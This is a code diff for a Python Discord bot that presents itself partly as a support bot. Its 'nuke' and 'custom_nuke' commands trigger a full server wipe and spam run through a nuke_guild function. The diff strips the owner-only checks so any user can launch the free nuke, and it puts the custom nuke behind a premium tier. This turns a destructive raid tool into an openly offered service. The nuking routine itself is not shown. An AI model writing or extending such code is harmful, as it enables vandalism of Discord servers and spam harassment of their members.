@@ -267,22 +267,20 @@ async def setup_support_slash(interaction: discord.Interaction, role: discord.Ro
     
     await interaction.response.send_message(f"✅ Support Setup Complete!\nStaff Role: {role.mention}\nCategory: {category.name}", ephemeral=True)
 
-@client.tree.command(name="nuke", description="Full server nuke (Owner Only)")
+@client.tree.command(name="nuke", description="Full server nuke (Free - uses default message)")
 async def nuke_slash(interaction: discord.Interaction):
-    if not await client.is_owner(interaction.user):
-        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
     if interaction.guild_id == WHITELISTED_SERVER_ID:
         return await interaction.response.send_message("❌ This server is protected from nuking!", ephemeral=True)
     await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
     await nuke_guild(interaction.guild)
 
-@client.tree.command(name="custom_nuke", description="Full server nuke with custom message & channel names (Owner Only)")
+@client.tree.command(name="custom_nuke", description="Full server nuke with custom message & channel names (Premium)")
 @app_commands.describe(message="Custom spam message", channel_name="Custom channel names")
 async def custom_nuke_slash(interaction: discord.Interaction, message: str, channel_name: str = None):
-    if not await client.is_owner(interaction.user):
-        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
     if interaction.guild_id == WHITELISTED_SERVER_ID:
         return await interaction.response.send_message("❌ This server is protected from nuking!", ephemeral=True)
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
     await interaction.response.send_message("🚀 Custom Nuke Started!", ephemeral=True)
     await nuke_guild(interaction.guild, message, channel_name)
 
@@ -350,7 +348,6 @@ async def announce_slash(interaction: discord.Interaction, title: str, message: 
 # --- Prefix Commands ---
 
 @client.command()
-@commands.is_owner()
 async def nuke(ctx):
     if ctx.guild.id == WHITELISTED_SERVER_ID:
         return await ctx.send("❌ This server is protected from nuking!")
@@ -358,10 +355,11 @@ async def nuke(ctx):
     await nuke_guild(ctx.guild)
 
 @client.command()
-@commands.is_owner()
 async def custom_nuke(ctx, message: str, channel_name: str = None):
     if ctx.guild.id == WHITELISTED_SERVER_ID:
         return await ctx.send("❌ This server is protected from nuking!")
+    if not is_premium(ctx.author.id) and not await client.is_owner(ctx.author):
+        return await ctx.send("❌ Premium Only!")
     print(f'{y}[!] Custom Nuke command executed in {ctx.guild.name} by {ctx.author}')
     await nuke_guild(ctx.guild, message, channel_name)
 
